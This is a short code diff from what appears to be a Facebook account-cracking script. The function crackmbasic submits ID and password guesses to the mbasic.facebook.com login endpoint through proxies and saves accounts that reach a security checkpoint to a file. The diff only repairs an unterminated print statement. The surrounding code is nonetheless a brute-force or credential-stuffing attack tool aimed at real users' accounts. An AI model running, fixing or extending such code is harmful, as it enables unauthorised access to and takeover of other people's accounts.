@@ -1710,7 +1710,7 @@ def crackmbasic(idf,pwv):
 
 			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print ('\r [bold yellow]*---> {idf}|{pw}\n *---> {ua}
+				print ('\r [bold yellow]*---> {idf}|{pw}\n *---> {ua}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
